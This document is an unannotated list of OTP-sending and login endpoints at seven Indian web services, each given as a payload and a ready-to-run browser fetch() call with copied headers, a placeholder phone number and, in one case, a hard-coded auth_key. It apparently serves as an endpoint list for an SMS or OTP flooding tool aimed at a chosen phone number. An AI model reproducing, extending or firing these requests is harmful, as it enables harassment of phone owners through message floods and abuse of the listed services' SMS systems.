### https://api.snapmint.com/v1/logins/send_otp
- payload -> {"mobile":"1234567890","type":"user","origin":"snap_checkout"}
- fetch("https://api.snapmint.com/v1/logins/send_otp", {
  "headers": {
    "content-type": "application/json; charset=UTF-8",
  },
  "body": "{\"mobile\":\"1234567890\",\"type\":\"user\",\"origin\":\"snap_checkout\"}",
  "method": "POST"
});

### https://www.decathlon.in/api/login/sendotp
- payload -> {"param":"1234567890","source":1}
- fetch("https://www.decathlon.in/api/login/sendotp", {
  "headers": {
    "accept": "application/json, text/plain, */*",
    "accept-language": "en-US,en;q=0.9,hi;q=0.8,la;q=0.7",
    "content-type": "application/json;charset=UTF-8",
    "sec-ch-ua": "\"Chromium\";v=\"104\", \" Not A;Brand\";v=\"99\", \"Google Chrome\";v=\"104\"",
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": "\"Windows\"",
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "same-origin",
    "Referer": "https://www.decathlon.in/",
    "Referrer-Policy": "strict-origin-when-cross-origin"
  },
  "body": "{\"param\":\"1234567890\",\"source\":1}",
  "method": "POST"
});

### https://www.acko.com/lp/new-bike/api/send_otp
- payload -> {"phone":"1234567890"}
- fetch("https://www.acko.com/lp/new-bike/api/send_otp", {
  "headers": {
    "accept": "*/*",
    "accept-language": "en-US,en;q=0.9,hi;q=0.8,la;q=0.7",
    "content-type": "application/json",
    "sec-ch-ua": "\"Chromium\";v=\"104\", \" Not A;Brand\";v=\"99\", \"Google Chrome\";v=\"104\"",
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": "\"Windows\"",
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "same-origin",
    "x-landing-path": "/lp/new-bike",
    "x-landing-url": "https://www.acko.com/lp/new-bike/bike/checkout/details?proposal_id=MLhjPTzbTrGyjA1CBtz4MQ&step=details&flow=undefined",
    "Referer": "https://www.acko.com/lp/new-bike/bike/checkout/details?proposal_id=MLhjPTzbTrGyjA1CBtz4MQ&step=details&flow=undefined",
    "Referrer-Policy": "strict-origin-when-cross-origin"
  },
  "body": "{\"phone\":\"1234567890\"}",
  "method": "POST"
});

### https://api.nnnow.com/d/apiV2/otp/generateOtp/v1/flash
- payload --> {"mobileNumber":"1234567890","otpTemplateId":"5b4e2e49b70e040008ffbcbe"}
- fetch("https://api.nnnow.com/d/apiV2/otp/generateOtp/v1/flash", {
  "headers": {
    "accept": "application/json",
    "accept-language": "en-US,en;q=0.9,hi;q=0.8,la;q=0.7",
    "bbversion": "v2",
    "content-type": "application/json",
    "correlationid": "8d91e852-54e7-4653-bbd3-da4193b3c2e4",
    "module": "odin",
    "sec-ch-ua": "\"Chromium\";v=\"104\", \" Not A;Brand\";v=\"99\", \"Google Chrome\";v=\"104\"",
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": "\"Windows\"",
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "same-site",
    "Referer": "https://www.nnnow.com/",
    "Referrer-Policy": "strict-origin-when-cross-origin"
  },
  "body": "{\"mobileNumber\":\"1234567890\",\"otpTemplateId\":\"5b4e2e49b70e040008ffbcbe\"}",
  "method": "POST"
});

### https://www.playrummy.com/mobileLogin.php
- payload --> deviceid=WEB-YourIPAdressHere-1660066556&mobilenumber=1234567890&currenttimestamp=1660066619608&retrycount=0&appos=generic_website&signup=0&latitude=0&longitude=0&newaccount=0&register=0&encryptedkey=eefe02d5f0140c1a8d64eacde0bed7e2
- fetch("https://www.playrummy.com/mobileLogin.php", {
  "headers": {
    "accept": "*/*",
    "accept-language": "en-US,en;q=0.9,hi;q=0.8,la;q=0.7",
    "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
    "sec-ch-ua": "\"Chromium\";v=\"104\", \" Not A;Brand\";v=\"99\", \"Google Chrome\";v=\"104\"",
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": "\"Windows\"",
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "same-origin",
    "x-requested-with": "XMLHttpRequest",
    "Referer": "https://www.playrummy.com/",
    "Referrer-Policy": "strict-origin-when-cross-origin"
  },
  "body": "deviceid=WEB-YourIPAdressHere-1660066556&mobilenumber=1234567890&currenttimestamp=1660066619608&retrycount=0&appos=generic_website&signup=0&latitude=0&longitude=0&newaccount=0&register=0&encryptedkey=eefe02d5f0140c1a8d64eacde0bed7e2",
  "method": "POST"
});

### https://userauth.voot.com/usersV3/v3/checkUser
- payload --> {"type":"mobile","mobile":"1234567890","countryCode":"+91"}
- fetch("https://userauth.voot.com/usersV3/v3/checkUser", {
  "headers": {
    "accept": "application/json, text/plain, */*",
    "accept-language": "en-US,en;q=0.9,hi;q=0.8,la;q=0.7",
    "content-type": "application/json;charset=UTF-8",
    "sec-ch-ua": "\"Chromium\";v=\"104\", \" Not A;Brand\";v=\"99\", \"Google Chrome\";v=\"104\"",
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": "\"Windows\"",
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "same-site",
    "Referer": "https://www.voot.com/",
    "Referrer-Policy": "strict-origin-when-cross-origin"
  },
  "body": "{\"type\":\"mobile\",\"mobile\":\"1234567890\",\"countryCode\":\"+91\"}",
  "method": "POST"
});

### https://blinkit.com/v2/accounts/
- payload --> user_phone=1234567890
- fetch("https://blinkit.com/v2/accounts/", {
  "headers": {
    "accept": "*/*",
    "accept-language": "en-US,en;q=0.9,hi;q=0.8,la;q=0.7",
    "app_client": "consumer_web",
    "auth_key": "4e3a92e963f19dae3ca71ad372bb6e53d0c3c3493a4cd3bf33e376335b3a1757",
    "content-type": "application/x-www-form-urlencoded",
    "platform": "mobile_web",
    "rn_bundle_version": "1009003012",
    "sec-ch-ua": "\"Chromium\";v=\"104\", \" Not A;Brand\";v=\"99\", \"Google Chrome\";v=\"104\"",
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": "\"Windows\"",
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "same-origin",
    "Referer": "https://blinkit.com/",
    "Referrer-Policy": "strict-origin-when-cross-origin"
  },
  "body": "user_phone=1234567890",
  "method": "POST"
});
